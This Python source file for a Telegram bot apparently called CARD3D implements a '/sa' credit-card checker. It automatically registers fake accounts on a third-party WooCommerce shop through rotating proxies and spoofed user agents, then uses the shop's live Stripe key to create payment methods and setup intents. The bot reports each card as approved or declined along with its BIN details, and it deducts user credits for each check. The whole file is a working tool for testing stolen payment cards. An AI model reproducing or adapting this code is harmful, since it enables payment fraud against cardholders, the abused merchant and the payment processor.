import re
import time
import random
import string
import traceback
import aiohttp
from pyrogram import filters
from CARD3D import app
from pyrogram.enums import ParseMode
from fake_useragent import UserAgent
from config import OWNER_ID
from CARD3D.core.mongo import has_premium_access, get_user, update_user, LEVELS
from CARD3D.modules.proxies import proxies  

async def get_bin_info(bin_number, session, proxy_url):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        async with session.get(url, proxy=proxy_url, timeout=15) as response:
            if response.status == 200:
                bin_info = await response.json()
                return (
                    bin_info.get("brand", "N/A"),
                    bin_info.get("type", "N/A"),
                    bin_info.get("level", "N/A"),
                    bin_info.get("bank", "N/A"),
                    bin_info.get("country_name", "N/A"),
                    bin_info.get("country_flag", ""),
                )
            return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
    except aiohttp.ClientError:
        return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
    

async def check_card(card_info, message, user_plan, user_plan_symbol, session, proxy_url):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()

    headers = {"user-agent": UserAgent().random}

    try:
        async with session.get('https://purpleprofessionalitalia.it/my-account/', proxy=proxy_url) as response:
            response_text = await response.text()
        
        register_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_text)
        if not register_nonce:
            return "Failed to extract nonce."

        register = register_nonce.group(1)
        email = ''.join(random.choices(string.ascii_lowercase, k=20)) + '@yahoo.com'

        data = {
            'email': email,
            'password': 'ASDzxc#123#',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/my-account/',
            'register': 'Registrati',
        }

        async with session.post('https://purpleprofessionalitalia.it/my-account/', data=data, proxy=proxy_url) as post_response:
            await post_response.text()

        async with session.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', proxy=proxy_url) as add_payment_response:
            response_text = await add_payment_response.text()
        
        nonce_match = re.findall(r'"add_card_nonce":"(.*?)"', response_text)
        if not nonce_match:
            return "Failed to extract card nonce."
        
        nonce = nonce_match[0]

    except Exception as e:
        print(f"Error during login POST request: {e}")
        return "Failed to perform login request."

    data = {
        'type': 'card',
        'billing_details[name]': '+',
        'billing_details[email]': email,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'key': 'pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'
    }

    try:
        async with session.post('https://api.stripe.com/v1/payment_methods', data=data, proxy=proxy_url) as stripe_response:
            stripe_resp = await stripe_response.json()
            stripe_id = stripe_resp.get('id')
            if not stripe_id:
                return "Failed to create Stripe payment method."
            
            print("Stripe ID Extraction Done ✅", stripe_id)

    except Exception as e:
        print(f"Stripe API request failed: {e}")
        return f"Failed to create Stripe payment for {card}"

    params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
    confirm_data = {'stripe_source_id': stripe_id, 'nonce': nonce}
    
    try:
        async with session.post('https://purpleprofessionalitalia.it/', params=params, headers=headers, data=confirm_data, proxy=proxy_url) as confirm_response:
            confirm_text = await confirm_response.text()

            print(f"Response Text: {confirm_text}")
        
    except Exception as e:
        return f"Error during payment confirmation: {e} for {card}"

    brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6], session, proxy_url)

    error_message_match = re.search(r'\"message\":\"(.*?)\"', confirm_text)
    if error_message_match:
            error_message = error_message_match.group(1)
            

    if 'success' in confirm_text:
        status = "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅"
        resp = "Approved"
    else:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        resp = error_message

    execution_time = round(time.time() - start_time, 2)

    final_response = (
        f"{status}\n\n"
        f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
        f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
        f"𝗧𝗶𝗺𝗲 ⇾ {execution_time} **Seconds**\n"
        f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})⤿ {user_plan} {user_plan_symbol} ⤾"
    )

    return final_response


card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

def extract_card_info(message):
    card_info = None
    if message.reply_to_message:
        card_info = re.search(card_pattern, message.reply_to_message.text)
        return card_info.group() if card_info else None
    try:
        card_info = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        pass
    return card_info


@app.on_message(filters.command("sa", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    has_access, access_msg, user_plan = await has_premium_access(user_id, chat_id, required_credits=0)
    if not has_access:
        await message.reply_text(access_msg, parse_mode=ParseMode.MARKDOWN)
        return

    user = await get_user(user_id)
    if not user:
        await message.reply_text(
            "❌ **You are not registered. Please register using  /register in private.**",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    user_plan = user.get("plan", "Free")
    user_credits = user.get("credits", 0)
    user_plan_symbol = LEVELS.get(user_plan, {}).get("symbol", "")

    if user_id == OWNER_ID:
        user_plan = "STRIPEHIT"
        user_plan_symbol = LEVELS["STRIPEHIT"]["symbol"]
        user_credits = -1

    card_info = extract_card_info(message)

    if not card_info or not card_pattern.match(card_info):
        await message.reply("Please provide valid card details in the format: `card_number|mm|yy|cvv`")
        return

    processing_msg = await message.reply("Processing your request...")

    headers = {"user-agent": UserAgent().random}
    proxy_url = await proxies()

    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        try:
            response = await check_card(card_info, message, user_plan, user_plan_symbol, session, proxy_url)
            await processing_msg.edit_text(response)

            if user_id != OWNER_ID:
                new_credits = user_credits - 1
                await update_user(user_id, {"credits": new_credits})

        except Exception as e:
            await processing_msg.edit_text(f"An error occurred: {str(e)}")
            traceback.print_exc()
